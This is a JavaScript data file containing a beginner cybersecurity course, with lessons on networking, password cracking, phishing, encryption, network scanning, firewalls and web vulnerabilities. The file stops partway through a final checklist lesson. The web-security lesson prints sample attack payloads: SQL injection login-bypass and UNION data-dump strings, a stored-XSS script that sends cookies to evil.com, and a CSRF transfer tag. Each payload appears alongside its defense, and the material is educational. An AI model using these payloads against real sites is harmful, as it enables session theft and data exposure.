export const courseData = {
  title: "Cybersecurity",
  subtitle: "Learn to protect yourself and hack ethically",
  chapters: [
    {
      id: 1,
      title: "Welcome to Cybersecurity",
      description: "What hackers do and why it matters",
      lessons: [
        {
          id: "1-1",
          title: "What is Cybersecurity?",
          duration: "8 min",
          content: `
## Welcome, Future Cyber Defender! 🛡️

Every day, hackers attack millions of computers, phones, and websites. **Cybersecurity** is the art of defending against these attacks — and understanding how they work.

### Why Should You Care?

Think about everything connected to the internet:
- Your phone 📱
- Your gaming console 🎮
- Smart TVs, cameras, doorbells 📷
- Cars, hospitals, power plants ⚡

ALL of these can be hacked. And someone needs to protect them.

### The Three Types of Hackers

| Type | Also Called | What They Do |
|------|-----------|-------------|
| **White Hat** | Ethical Hacker | Gets paid to find & fix security holes |
| **Black Hat** | Criminal Hacker | Breaks into systems illegally |
| **Gray Hat** | Somewhere in between | Finds bugs without permission, but reports them |

### What You'll Learn

In this course, you'll think like a hacker (the good kind!):

✅ How passwords get cracked
✅ How websites get hacked
✅ How to spot phishing scams
✅ How to protect your accounts
✅ How encryption works
✅ How to analyze network traffic
✅ Real hacking tools (used ethically!)

### The CIA Triad

The foundation of all cybersecurity:

- **C**onfidentiality — Only authorized people see the data
- **I**ntegrity — Data hasn't been tampered with
- **A**vailability — Systems are up and running when needed

\`\`\`
       Confidentiality
           /\\
          /  \\
         /    \\
        /  CIA  \\
       /________\\
  Integrity    Availability
\`\`\`

Every security decision balances these three goals.

### Real-World Cyber Attacks

| Attack | Year | What Happened |
|--------|------|--------------|
| Yahoo Breach | 2013 | 3 billion accounts stolen |
| WannaCry | 2017 | Ransomware hit 200,000 computers |
| SolarWinds | 2020 | Hackers infiltrated US government |
| Colonial Pipeline | 2021 | Shut down fuel supply for days |

<tip>
💡 Cybersecurity jobs pay $80,000-$200,000+ and there's a massive shortage of skilled workers!
</tip>

### The Golden Rule

**Never hack anything you don't have permission to hack.**

This course teaches you skills for defense and ethical hacking ONLY. Using these skills illegally can land you in serious trouble.

Ready to become a cyber defender? Let's go! 🚀
          `
        },
        {
          id: "1-2",
          title: "How the Internet Actually Works",
          duration: "10 min",
          content: `
## Under the Hood of the Internet 🌐

To defend the internet, you need to understand how it works!

### IP Addresses — Your Digital Address

Every device on the internet has an **IP address**:

\`\`\`
Your computer:  192.168.1.100  (private/local)
Google's server: 142.250.80.46  (public)
\`\`\`

**IPv4**: 4 numbers, 0-255 each → \`192.168.1.1\`
**IPv6**: Longer, newer format → \`2001:0db8:85a3::8a2e:0370:7334\`

### DNS — The Internet's Phone Book

When you type \`google.com\`, your computer asks a **DNS server**: "What's the IP for google.com?"

\`\`\`
You → "What IP is google.com?"
DNS → "It's 142.250.80.46"
You → connects to 142.250.80.46
\`\`\`

\`\`\`bash
# Try it yourself! Open terminal and type:
nslookup google.com

# Or:
ping google.com
\`\`\`

### Ports — Doors Into a Computer

Each computer has **65,535 ports**. Think of them as doors:

| Port | Service | What It Does |
|------|---------|-------------|
| 80 | HTTP | Regular websites |
| 443 | HTTPS | Secure websites |
| 22 | SSH | Remote access |
| 25 | SMTP | Email sending |
| 3306 | MySQL | Databases |

<warning>
⚠️ Open ports are like unlocked doors — hackers scan for them!
</warning>

### HTTP vs HTTPS

\`\`\`
HTTP  = Sending a postcard (anyone can read it)
HTTPS = Sending a sealed letter (encrypted!)
\`\`\`

Always check for the 🔒 lock icon in your browser!

### Packets — How Data Travels

Data doesn't travel as one big file. It's broken into **packets**:

\`\`\`
Your message: "Hello World!"

Split into packets:
[Packet 1] "Hel" → Route A → ✓
[Packet 2] "lo "  → Route B → ✓
[Packet 3] "Wor" → Route A → ✓
[Packet 4] "ld!" → Route C → ✓

Reassembled: "Hello World!"
\`\`\`

Each packet contains:
- **Source IP** — Where it came from
- **Destination IP** — Where it's going
- **Data** — The actual content
- **Checksum** — Verify it wasn't corrupted

### The OSI Model (Simplified)

\`\`\`
7. Application  ← You interact here (browser, email)
6. Presentation ← Data formatting (encryption)
5. Session      ← Connection management
4. Transport    ← TCP/UDP (reliable delivery)
3. Network      ← IP addresses, routing
2. Data Link    ← MAC addresses, switches
1. Physical     ← Cables, Wi-Fi signals
\`\`\`

<tip>
💡 Hackers can attack at ANY layer. That's why security needs to cover all of them!
</tip>

### Try It: See Your Network Info

\`\`\`bash
# Windows
ipconfig

# Mac/Linux
ifconfig
# or
ip addr

# See your public IP
curl ifconfig.me
\`\`\`

Understanding networking is the foundation of cybersecurity! 🎯
          `
        }
      ]
    },
    {
      id: 2,
      title: "Passwords & Authentication",
      description: "How passwords get cracked and how to stay safe",
      lessons: [
        {
          id: "2-1",
          title: "How Passwords Get Cracked",
          duration: "12 min",
          content: `
## Password Cracking 101 🔓

Passwords are the #1 way we protect accounts. And the #1 thing hackers target.

### How Passwords Are Stored

Websites DON'T store your actual password (usually). They store a **hash**:

\`\`\`
Your password: "minecraft123"
        ↓ Hash Function (SHA-256)
Stored hash: "a1b2c3d4e5f6789..."
\`\`\`

A hash is a one-way function — you can't reverse it to get the password back.

\`\`\`python
# Python example of hashing
import hashlib

password = "minecraft123"
hashed = hashlib.sha256(password.encode()).hexdigest()
print(hashed)
# Output: a1b2c3d4e5f6... (always the same for same input!)
\`\`\`

### Attack #1: Brute Force

Try EVERY possible combination:

\`\`\`
Trying: a        ✗
Trying: b        ✗
Trying: c        ✗
...
Trying: aa       ✗
Trying: ab       ✗
...
(This takes forever for long passwords!)
\`\`\`

| Password Length | Possible Combos | Time to Crack |
|----------------|----------------|--------------|
| 4 characters | 14 million | Instant |
| 6 characters | 19 billion | Seconds |
| 8 characters | 6 trillion | Hours |
| 12 characters | 95 sextillion | Centuries |
| 16 characters | ... | Heat death of universe |

### Attack #2: Dictionary Attack

Use a list of common passwords:

\`\`\`
password       ✗
123456         ✗
qwerty         ✗
minecraft123   ✓ FOUND!
\`\`\`

### The Most Common Passwords (DON'T use these!)

1. 123456
2. password
3. 123456789
4. qwerty
5. abc123
6. password1
7. iloveyou
8. 12345678

<warning>
⚠️ If your password is on this list, change it RIGHT NOW!
</warning>

### Attack #3: Rainbow Tables

Pre-computed hashes for millions of passwords:

\`\`\`
"password"    → 5e884898da28047...
"123456"      → 8d969eef6ecad3c...
"minecraft"   → 7c9e7c1b2d4f8a1...
\`\`\`

Hackers just look up the hash! That's why websites use **salting**:

\`\`\`
password + random_salt → unique_hash
"minecraft" + "x7k2" → "completely_different_hash"
"minecraft" + "p9m1" → "another_different_hash"
\`\`\`

Same password, different salt = different hash. Rainbow tables become useless!

### Attack #4: Credential Stuffing

1. Hacker gets leaked passwords from Site A
2. Tries same email/password on Site B, C, D...
3. People reuse passwords → accounts get hacked

<tip>
💡 This is why you should NEVER reuse passwords across different sites!
</tip>

### How to Make Strong Passwords

**Bad:** \`minecraft123\` (dictionary word + numbers)
**Better:** \`M!n3cr@ft_2024!\` (substitutions)
**Best:** \`correct-horse-battery-staple\` (passphrase!)

Passphrases are:
- Easy to remember
- Hard to crack
- Long = more secure

\`\`\`
4 random words = 20+ characters = extremely secure
"purple-elephant-dancing-tuesday"
\`\`\`

You now understand how hackers crack passwords! 🎓
          `
        },
        {
          id: "2-2",
          title: "Two-Factor Authentication",
          duration: "8 min",
          content: `
## The Extra Lock on Your Door 🔐

Even the strongest password can be stolen. That's where **2FA** comes in!

### What is 2FA?

Two-Factor Authentication requires TWO things to log in:

\`\`\`
Factor 1: Something you KNOW (password)
    +
Factor 2: Something you HAVE (phone/key)
    =
Much harder to hack!
\`\`\`

### Types of 2FA

| Method | Security | Convenience |
|--------|----------|------------|
| SMS Code | ⭐⭐ | ⭐⭐⭐⭐⭐ |
| Authenticator App | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ |
| Hardware Key (YubiKey) | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ |
| Biometric (fingerprint) | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ |

### Why SMS 2FA is Weak

**SIM Swapping Attack:**
1. Hacker calls your phone carrier
2. Pretends to be you
3. Transfers your number to their SIM
4. Now THEY get your SMS codes!

\`\`\`
Hacker: "Hi, I lost my phone. Can you transfer 
         my number to this new SIM?"
Carrier: "Sure! What's your mother's maiden name?"
Hacker: (found it on social media) "Smith"
Carrier: "Done!"
Your 2FA codes: → Hacker's phone 😱
\`\`\`

### Authenticator Apps (Recommended!)

Apps like **Google Authenticator** or **Authy** generate codes that change every 30 seconds:

\`\`\`
Your app shows: 847 291
                ████████░░ (25 seconds left)

After 30 seconds: 163 502
                  ██░░░░░░░░ (new code!)
\`\`\`

### How TOTP Works

\`\`\`
Secret Key (shared once) + Current Time
        ↓
    HMAC Algorithm
        ↓
    6-digit code
\`\`\`

\`\`\`python
# Simplified TOTP concept
import time
import hashlib

secret = "JBSWY3DPEHPK3PXP"
time_step = int(time.time() / 30)  # Changes every 30 sec
code = hashlib.sha1(f"{secret}{time_step}".encode()).hexdigest()[-6:]
print(f"Your code: {code}")
\`\`\`

### Hardware Security Keys

Physical USB keys (like YubiKey):
- Plug in and tap to authenticate
- **Impossible** to phish remotely
- Used by Google employees (zero phishing since adoption!)

### Set Up 2FA NOW!

Priority accounts to protect:
1. **Email** (password reset for everything!)
2. **Banking/Financial**
3. **Social Media**
4. **Gaming accounts** (Steam, etc.)

<tip>
💡 Always save your **backup codes** when setting up 2FA! Store them somewhere safe offline.
</tip>

### Password Managers

Use one to generate and store unique passwords:
- **Bitwarden** (free, open source)
- **1Password** (paid, great UI)
- **KeePass** (free, local only)

\`\`\`
Without manager: Same password everywhere 😰
With manager: Unique 24-char password per site 💪
\`\`\`

You only need to remember ONE master password!

Enable 2FA on everything. It's the single best thing you can do for security! 🔐
          `
        }
      ]
    },
    {
      id: 3,
      title: "Social Engineering",
      description: "Hacking the human mind",
      lessons: [
        {
          id: "3-1",
          title: "Phishing Attacks",
          duration: "10 min",
          content: `
## The Art of Deception 🎣

The easiest way to hack someone? **Ask them for their password.** Seriously.

### What is Phishing?

Fake emails/messages that trick you into giving up information:

\`\`\`
From: security@amaz0n.com  ← Notice the ZERO!
Subject: Your account has been compromised!

Dear Customer,

We detected suspicious activity. Click here to 
verify your identity immediately or your account 
will be suspended in 24 hours!

[VERIFY NOW] ← Links to fake-amazon-login.com
\`\`\`

### Spot the Red Flags 🚩

1. **Urgency** — "Act NOW or else!"
2. **Fear** — "Your account is compromised!"
3. **Bad sender** — \`security@amaz0n.com\` (not amazon.com)
4. **Suspicious links** — Hover before clicking!
5. **Grammar errors** — "Dear Valued Customers"
6. **Generic greeting** — "Dear Customer" not your name
7. **Too good to be true** — "You won $1,000,000!"

### Types of Phishing

| Type | Target | Example |
|------|--------|---------|
| **Phishing** | Anyone | Mass fake emails |
| **Spear Phishing** | Specific person | Researched, personalized |
| **Whaling** | CEO/executives | High-value targets |
| **Smishing** | Via SMS | "Your package is delayed" |
| **Vishing** | Via phone call | "This is the IRS..." |

### Real Phishing Examples

**Fake Login Page:**
\`\`\`
Real:  https://accounts.google.com/login
Fake:  https://accounts.g00gle.com/login  ← zeros!
Fake:  https://google-accounts-login.com  ← wrong domain!
Fake:  https://accounts.google.com.evil.com/login ← subdomain trick!
\`\`\`

**URL Anatomy:**
\`\`\`
https://accounts.google.com.evil.com/login
         ↑                    ↑
    looks legit          ACTUAL domain is evil.com!
\`\`\`

<warning>
⚠️ Always check the ACTUAL domain — it's the part right before .com/.org/.net!
</warning>

### How to Check a Suspicious Email

\`\`\`
1. Don't click any links!
2. Check the sender's FULL email address
3. Hover over links to see real URL
4. Look for urgency/fear tactics
5. When in doubt, go directly to the website
   (type it yourself, don't click the link)
\`\`\`

### Phishing Quiz

Which URL is real?

\`\`\`
A) https://www.paypal.com/login
B) https://www.paypa1.com/login
C) https://paypal.secure-login.com
D) https://www.paypal.com.verify.net/login
\`\`\`

Answer: **A** — it's the only one with the real paypal.com domain!

<tip>
💡 When in doubt, NEVER click email links. Open your browser and type the website address yourself!
</tip>

### Social Media Phishing

Hackers use info from your profiles to make convincing attacks:

\`\`\`
Public info they find:
- Your school name
- Your pet's name
- Your birthday
- Your friends list
- Where you work

They use this to:
- Guess security questions
- Create targeted phishing
- Impersonate your friends
\`\`\`

Stay skeptical! If something feels off, it probably is. 🎯
          `
        },
        {
          id: "3-2",
          title: "Social Engineering Tactics",
          duration: "10 min",
          content: `
## Hacking Without Code 🧠

**Social engineering** is manipulating people into breaking security. No code needed!

### The 6 Principles of Influence

Hackers exploit these psychological principles:

**1. Authority**
\`\`\`
"Hi, I'm from the IT department. I need your 
password to fix a critical issue."
→ People obey authority figures
\`\`\`

**2. Urgency**
\`\`\`
"Your account will be deleted in 1 HOUR unless 
you verify RIGHT NOW!"
→ Panic overrides critical thinking
\`\`\`

**3. Social Proof**
\`\`\`
"Everyone in your department has already updated 
their passwords using this link."
→ If others did it, it must be safe
\`\`\`

**4. Reciprocity**
\`\`\`
"I helped fix your computer last week, remember? 
I just need a small favor..."
→ We feel obligated to return favors
\`\`\`

**5. Liking**
\`\`\`
"Hey! We met at the conference, right? Great 
presentation! By the way..."
→ We trust people we like
\`\`\`

**6. Scarcity**
\`\`\`
"Only the first 10 people get free access! 
Click now before it's gone!"
→ Fear of missing out
\`\`\`

### Real Attack: Tailgating

Following someone through a locked door:

\`\`\`
*Employee badges into building*
Hacker: "Oh hey, can you hold the door? 
         My hands are full!" 📦
Employee: "Sure!"
Hacker: *walks right into secure building*
\`\`\`

### Real Attack: Pretexting

Creating a fake scenario:

\`\`\`
Hacker calls reception:
"Hi, I'm from Cisco doing a network audit. 
I need the admin password for router 
configuration check."

Receptionist: "Oh, let me ask... 
The admin password is 'cisco123'"
\`\`\`

### Real Attack: Baiting

Leaving infected USB drives in parking lots:

\`\`\`
*Employee finds USB labeled "Salary Data 2024"*
Employee: "Ooh, interesting!" *plugs it in*
USB: *installs malware* 😈
\`\`\`

<warning>
⚠️ NEVER plug in USB drives you find! They could contain malware that runs automatically.
</warning>

### Real Attack: Quid Pro Quo

\`\`\`
Hacker calls employees randomly:
"Hi, I'm tech support. Are you having 
any computer problems?"

Employee: "Actually, yes! My email is slow."

Hacker: "I can fix that! Just install this 
remote access tool and give me your login..."
\`\`\`

### Defense Strategies

\`\`\`
✅ Verify identity independently
   (Call them back on a known number)

✅ Never give passwords over phone/email
   (IT will NEVER ask for your password)

✅ Question urgency
   ("Let me verify this first")

✅ Be suspicious of unsolicited help

✅ Report suspicious contacts
\`\`\`

<tip>
💡 The best defense against social engineering is awareness. Now that you know these tricks, they're much less likely to work on you!
</tip>

### Try This: Social Engineering Awareness

Next time you get a suspicious email or message:
1. Identify which principle(s) of influence it uses
2. Find the red flags
3. Think about what the attacker wants

Practice makes you harder to hack! 🛡️
          `
        }
      ]
    },
    {
      id: 4,
      title: "Encryption & Cryptography",
      description: "The math that keeps secrets safe",
      lessons: [
        {
          id: "4-1",
          title: "Encryption Basics",
          duration: "12 min",
          content: `
## Secret Messages 🔐

Encryption turns readable text into unreadable gibberish — and back again!

### Plaintext vs Ciphertext

\`\`\`
Plaintext:  "HELLO WORLD"     (readable)
     ↓ Encrypt with key
Ciphertext: "KHOOR ZRUOG"     (gibberish)
     ↓ Decrypt with key
Plaintext:  "HELLO WORLD"     (readable again!)
\`\`\`

### Caesar Cipher (The Oldest Encryption)

Shift each letter by N positions:

\`\`\`
Key: Shift by 3

A → D    H → K
B → E    E → H
C → F    L → O
...      O → R

HELLO → KHOOR
\`\`\`

\`\`\`python
# Caesar Cipher in Python
def caesar_encrypt(text, shift):
    result = ""
    for char in text:
        if char.isalpha():
            base = ord('A') if char.isupper() else ord('a')
            result += chr((ord(char) - base + shift) % 26 + base)
        else:
            result += char
    return result

# Encrypt
secret = caesar_encrypt("HELLO WORLD", 3)
print(secret)  # KHOOR ZRUOG

# Decrypt (shift backwards)
original = caesar_encrypt(secret, -3)
print(original)  # HELLO WORLD
\`\`\`

### Why Caesar Cipher is Weak

Only 26 possible shifts — try them all!

\`\`\`
KHOOR → shift 1  → JGNNQ  ✗
KHOOR → shift 2  → IFMMP  ✗
KHOOR → shift 3  → HELLO  ✓ Found it!
\`\`\`

### Symmetric Encryption

Same key to encrypt AND decrypt:

\`\`\`
    Key: "mysecretkey"
         ↓
Alice ──[Encrypt]──→ Ciphertext ──[Decrypt]──→ Bob
         ↑                                      ↑
    Uses same key                          Uses same key
\`\`\`

Modern symmetric algorithms:
- **AES** (Advanced Encryption Standard) — The gold standard
- **ChaCha20** — Fast, used in HTTPS

### Asymmetric Encryption (Public Key)

TWO different keys — a public key and a private key:

\`\`\`
Bob has:
  🔑 Public Key  (shared with everyone)
  🗝️ Private Key (kept secret!)

Alice wants to send Bob a message:
  1. Alice encrypts with Bob's PUBLIC key
  2. Only Bob's PRIVATE key can decrypt it!
\`\`\`

\`\`\`
Alice: "Hey Bob!" 
  → Encrypt with Bob's 🔑 Public Key
  → "x8k2m9p..."
  → Send to Bob

Bob receives: "x8k2m9p..."
  → Decrypt with 🗝️ Private Key  
  → "Hey Bob!"

Hacker intercepts: "x8k2m9p..."
  → Has no private key
  → Can't decrypt! 🔒
\`\`\`

### Real-World Uses

| Where | Encryption Used |
|-------|----------------|
| HTTPS websites | TLS (asymmetric + symmetric) |
| WhatsApp | Signal Protocol (end-to-end) |
| Bitcoin | Elliptic Curve Cryptography |
| Wi-Fi (WPA3) | AES encryption |
| File storage | AES-256 |

<tip>
💡 When you see HTTPS, your browser and the server did an asymmetric key exchange, then switched to faster symmetric encryption for the actual data!
</tip>

### Hashing vs Encryption

\`\`\`
Encryption: Plaintext ←→ Ciphertext (reversible!)
Hashing:    Plaintext  →  Hash      (one-way only!)
\`\`\`

Hashing is used for passwords — the website never needs to get your password back, just check if it matches!

Understanding encryption is understanding the backbone of internet security! 🔐
          `
        },
        {
          id: "4-2",
          title: "HTTPS & Secure Communication",
          duration: "10 min",
          content: `
## How HTTPS Keeps You Safe 🔒

Every time you visit a website with 🔒, encryption is protecting you!

### The TLS Handshake

When you visit https://google.com:

\`\`\`
1. YOUR BROWSER → "Hello! I want a secure connection"
2. GOOGLE → "Here's my certificate + public key" 📜
3. YOUR BROWSER → Verifies certificate is legit
4. YOUR BROWSER → Generates a session key
5. YOUR BROWSER → Encrypts session key with Google's 
                  public key, sends it
6. GOOGLE → Decrypts with private key
7. BOTH → Now share the same session key!
8. ALL DATA → Encrypted with session key 🔒
\`\`\`

### Certificates — Proof of Identity

A certificate says: "I am really google.com"

\`\`\`
Certificate for: google.com
Issued by: Google Trust Services (CA)
Valid: Jan 2024 - Apr 2024
Public Key: [included]
Signature: [CA signed this]
\`\`\`

**Certificate Authorities (CAs)** are trusted organizations that verify identities. Your browser comes with a list of trusted CAs.

### What Happens Without HTTPS

On public Wi-Fi with HTTP:

\`\`\`
You → "My password is hunter2" → Wi-Fi → Website
                                   ↑
                              Hacker sees:
                         "My password is hunter2" 😱

With HTTPS:
You → "x8k2m9p4..." → Wi-Fi → Website
                         ↑
                    Hacker sees:
                  "x8k2m9p4..." 🤷
\`\`\`

### Man-in-the-Middle (MITM) Attack

\`\`\`
Normal:
You ←──────────→ Google

MITM Attack:
You ←────→ Hacker ←────→ Google
           (reads everything!)
\`\`\`

HTTPS prevents this because the hacker can't forge Google's certificate!

### Check a Site's Certificate

Click the 🔒 in your browser:
1. See who issued the certificate
2. Check if it's valid
3. View the encryption details

\`\`\`bash
# Check certificate from terminal
openssl s_client -connect google.com:443 -brief

# See certificate details
echo | openssl s_client -connect google.com:443 2>/dev/null | openssl x509 -text
\`\`\`

### End-to-End Encryption (E2EE)

Apps like Signal and WhatsApp use E2EE:

\`\`\`
Regular encryption:
You → [Encrypted] → Server [DECRYPTED] → [Encrypted] → Friend
                     Server can read! 😰

End-to-End encryption:
You → [Encrypted] → Server [still encrypted] → Friend
                     Server can't read! ✅
\`\`\`

Only you and the recipient have the keys!

### VPNs — Your Encrypted Tunnel

\`\`\`
Without VPN:
You → ISP (sees everything) → Internet
      Your ISP knows every site you visit!

With VPN:
You → [Encrypted Tunnel] → VPN Server → Internet
      ISP sees only encrypted data!
      But... VPN server sees your traffic
\`\`\`

<warning>
⚠️ VPNs move trust, not remove it. You're trusting the VPN provider instead of your ISP. Choose carefully!
</warning>

<tip>
💡 Free VPNs often sell your data. If you're not paying, YOU are the product!
</tip>

Now you understand how encryption protects your data online! 🛡️
          `
        }
      ]
    },
    {
      id: 5,
      title: "Network Security",
      description: "Defend and analyze networks",
      lessons: [
        {
          id: "5-1",
          title: "Network Scanning & Reconnaissance",
          duration: "14 min",
          content: `
## Seeing What's on Your Network 🔍

Before you can defend a network, you need to know what's on it!

### What is Reconnaissance?

The first step in both hacking AND defending:
1. **What devices are connected?**
2. **What ports are open?**
3. **What services are running?**

### Nmap — The Network Scanner

**Nmap** is the most famous security scanning tool:

\`\`\`bash
# Scan your local network (find all devices)
nmap -sn 192.168.1.0/24

# Output:
# Host is up: 192.168.1.1    (Router)
# Host is up: 192.168.1.100  (Your PC)
# Host is up: 192.168.1.101  (Phone)
# Host is up: 192.168.1.105  (Smart TV)
\`\`\`

### Port Scanning

\`\`\`bash
# Scan a specific device for open ports
nmap 192.168.1.1

# Output:
# PORT    STATE  SERVICE
# 22/tcp  open   ssh
# 80/tcp  open   http
# 443/tcp open   https
# 8080/tcp open  http-proxy
\`\`\`

### Understanding Port States

| State | Meaning |
|-------|---------|
| **open** | Service is listening (accessible!) |
| **closed** | Port exists but no service |
| **filtered** | Firewall is blocking the scan |

### Wireshark — See ALL Network Traffic

**Wireshark** captures and displays every packet on your network:

\`\`\`
No. | Time    | Source          | Dest            | Protocol | Info
1   | 0.000   | 192.168.1.100  | 142.250.80.46  | TCP      | SYN
2   | 0.012   | 142.250.80.46  | 192.168.1.100  | TCP      | SYN-ACK
3   | 0.013   | 192.168.1.100  | 142.250.80.46  | TCP      | ACK
4   | 0.014   | 192.168.1.100  | 142.250.80.46  | TLS      | Client Hello
\`\`\`

### What You Can See in Wireshark

\`\`\`
✅ DNS queries (what sites devices visit)
✅ Unencrypted HTTP traffic
✅ Connection patterns
✅ Suspicious traffic
❌ HTTPS content (encrypted!)
❌ VPN traffic content
\`\`\`

### Netstat — Check Your Own Connections

\`\`\`bash
# See all active connections on your computer
netstat -an

# Windows: see which programs have connections
netstat -ab

# Mac/Linux: with process IDs
netstat -tulpn
# or
ss -tulpn
\`\`\`

<tip>
💡 If you see connections to IPs you don't recognize, it could be malware phoning home!
</tip>

### DNS Lookup Tools

\`\`\`bash
# Find IP of a domain
nslookup example.com

# Detailed DNS info
dig example.com

# Reverse lookup (IP → domain)
nslookup 8.8.8.8
# Result: dns.google
\`\`\`

### Traceroute — Follow the Path

See every router between you and a destination:

\`\`\`bash
# Mac/Linux
traceroute google.com

# Windows
tracert google.com

# Output:
# 1  192.168.1.1      (your router)
# 2  10.0.0.1         (ISP)
# 3  72.14.215.85     (backbone)
# 4  142.250.80.46    (Google!)
\`\`\`

### Practice: Scan Your Home Network

\`\`\`bash
# 1. Find your IP
ifconfig  # or ipconfig on Windows

# 2. Scan your network
nmap -sn 192.168.1.0/24

# 3. Count devices - do you recognize them all?
# Unknown devices = potential security issue!
\`\`\`

<warning>
⚠️ Only scan networks you OWN or have permission to scan. Scanning others' networks can be illegal!
</warning>

Knowing your network is the first step to defending it! 🔍
          `
        },
        {
          id: "5-2",
          title: "Firewalls & Defense",
          duration: "10 min",
          content: `
## Building Your Fortress 🏰

Now that you can see what's on a network, let's protect it!

### What is a Firewall?

A firewall is a gatekeeper that decides what traffic gets in and out:

\`\`\`
Internet → [FIREWALL] → Your Network
                ↓
        Rules decide:
        ✅ Allow web traffic (80, 443)
        ✅ Allow email (25, 587)
        ❌ Block everything else
\`\`\`

### Firewall Rules

Rules follow this format:
\`\`\`
ACTION  DIRECTION  PROTOCOL  PORT  SOURCE/DEST

ALLOW   INBOUND    TCP       443   Any → Server
ALLOW   OUTBOUND   TCP       80    Server → Any  
DENY    INBOUND    TCP       22    Any → Server
DENY    INBOUND    ALL       ALL   Any → Any (default)
\`\`\`

### Linux Firewall (iptables/ufw)

\`\`\`bash
# UFW (Uncomplicated Firewall) - easy mode!

# Enable firewall
sudo ufw enable

# Allow web server
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp

# Allow SSH from specific IP only
sudo ufw allow from 192.168.1.100 to any port 22

# Block everything else (default)
sudo ufw default deny incoming
sudo ufw default allow outgoing

# Check rules
sudo ufw status
\`\`\`

### Windows Firewall

\`\`\`
Settings → Windows Security → Firewall
- Domain networks: ON
- Private networks: ON
- Public networks: ON (most restrictive!)
\`\`\`

### Types of Firewalls

| Type | What It Does |
|------|-------------|
| **Packet Filter** | Checks each packet against rules |
| **Stateful** | Tracks connection states |
| **Application** | Understands HTTP, DNS, etc. |
| **Next-Gen (NGFW)** | Deep inspection + AI |

### Intrusion Detection (IDS) vs Prevention (IPS)

\`\`\`
IDS: "Hey, I saw something suspicious!" (alerts only)
IPS: "Suspicious traffic BLOCKED!" (takes action)
\`\`\`

### Network Segmentation

Don't put everything on one network!

\`\`\`
BAD (flat network):
[Server] - [PC] - [Smart TV] - [IoT Camera]
  ↑ If one gets hacked, hacker has access to ALL

GOOD (segmented):
[Server VLAN] | [Office VLAN] | [IoT VLAN]
  ↑ Hacked IoT camera can't reach the server!
\`\`\`

### Wi-Fi Security

| Protocol | Security | Status |
|----------|----------|--------|
| WEP | ❌ Broken | Never use |
| WPA | ⚠️ Weak | Avoid |
| WPA2 | ✅ Good | Current standard |
| WPA3 | ✅✅ Best | Use if available |

\`\`\`
Your Wi-Fi Checklist:
☐ WPA2 or WPA3 enabled
☐ Strong password (not "password123")
☐ Default router admin password changed
☐ WPS disabled (it's hackable!)
☐ Guest network for visitors
☐ Router firmware up to date
\`\`\`

<tip>
💡 Your router's admin page is usually at 192.168.1.1 or 192.168.0.1 — log in and check your security settings!
</tip>

### Defense in Depth

Don't rely on just one defense:

\`\`\`
Layer 1: Firewall (network perimeter)
Layer 2: Antivirus (endpoint protection)
Layer 3: Updates/Patches (close vulnerabilities)
Layer 4: Strong passwords + 2FA (access control)
Layer 5: Training (human awareness)
Layer 6: Backups (recovery plan)
\`\`\`

Multiple layers = much harder to hack! 🏰
          `
        }
      ]
    },
    {
      id: 6,
      title: "Web Security",
      description: "How websites get hacked",
      lessons: [
        {
          id: "6-1",
          title: "Common Web Vulnerabilities",
          duration: "14 min",
          content: `
## How Websites Get Hacked 🌐

Websites are one of the biggest attack targets. Let's learn how they break!

### SQL Injection (SQLi)

The #1 web vulnerability for decades!

Normal login:
\`\`\`sql
SELECT * FROM users WHERE username = 'alice' AND password = 'secret123'
\`\`\`

Hacker enters this as username:
\`\`\`
' OR '1'='1' --
\`\`\`

The query becomes:
\`\`\`sql
SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = ''
\`\`\`

\`'1'='1'\` is always true → Returns ALL users → Hacker is logged in! 😱

### SQL Injection - Data Theft

\`\`\`sql
-- Hacker enters in search box:
' UNION SELECT username, password FROM users --

-- Returns all usernames and passwords!
\`\`\`

### Defense Against SQLi

\`\`\`python
# BAD - Vulnerable to SQL injection!
query = f"SELECT * FROM users WHERE name = '{user_input}'"

# GOOD - Parameterized query (safe!)
query = "SELECT * FROM users WHERE name = ?"
cursor.execute(query, (user_input,))
\`\`\`

<warning>
⚠️ NEVER put user input directly into SQL queries! Always use parameterized queries.
</warning>

### Cross-Site Scripting (XSS)

Injecting JavaScript into a website:

\`\`\`html
<!-- Hacker posts this as a comment: -->
<script>
  document.location = 'https://evil.com/steal?cookie=' 
    + document.cookie;
</script>

<!-- When other users view the comment, 
     their cookies get stolen! -->
\`\`\`

### Types of XSS

| Type | How It Works |
|------|-------------|
| **Stored XSS** | Malicious code saved in database (comments, profiles) |
| **Reflected XSS** | Code in URL, reflected back by server |
| **DOM XSS** | Manipulates page JavaScript directly |

### Defense Against XSS

\`\`\`python
# Escape HTML special characters
import html
safe_input = html.escape(user_input)
# <script> becomes &lt;script&gt; (won't execute!)
\`\`\`

\`\`\`
Content-Security-Policy: script-src 'self'
↑ Only allow scripts from your own domain!
\`\`\`

### Cross-Site Request Forgery (CSRF)

Trick logged-in users into performing actions:

\`\`\`html
<!-- On evil website: -->
<img src="https://bank.com/transfer?to=hacker&amount=10000">

<!-- Your browser sends the request WITH your 
     bank session cookie! -->
\`\`\`

Defense: **CSRF tokens** — random values that attackers can't guess.

### Insecure Direct Object References (IDOR)

\`\`\`
Your profile: https://site.com/user/profile?id=123
Change to:    https://site.com/user/profile?id=124
→ See someone else's profile! 😱
\`\`\`

Defense: Always check authorization on the server!

### The OWASP Top 10

The most critical web security risks:

1. Broken Access Control
2. Cryptographic Failures
3. Injection (SQLi, XSS)
4. Insecure Design
5. Security Misconfiguration
6. Vulnerable Components
7. Authentication Failures
8. Data Integrity Failures
9. Security Logging Failures
10. Server-Side Request Forgery

<tip>
💡 The OWASP Top 10 is updated regularly and is the gold standard for web security awareness!
</tip>

### Practice: Try Hacking (Legally!)

Safe practice environments:
- **DVWA** (Damn Vulnerable Web App)
- **HackTheBox** (online challenges)
- **TryHackMe** (guided learning)
- **PortSwigger Web Security Academy** (free!)

These are LEGAL practice environments designed to be hacked! 🎯
          `
        },
        {
          id: "6-2",
          title: "Securing Your Digital Life",
          duration: "10 min",
          content: `
## Your Personal Security Checklist ✅

Let's apply everything you've learned to protect YOUR digital life!

### Browser Security

\`\`\`
✅ Use HTTPS Everywhere (or browser's built-in)
✅ Block third-party cookies
✅ Use ad blocker (uBlock Origin)
✅ Don't save passwords in browser
   (use a password manager instead!)
✅ Keep browser updated
✅ Review extensions (remove unused ones)
\`\`\`

### Phone Security

\`\`\`
✅ Enable screen lock (PIN, fingerprint, face)
✅ Keep OS and apps updated
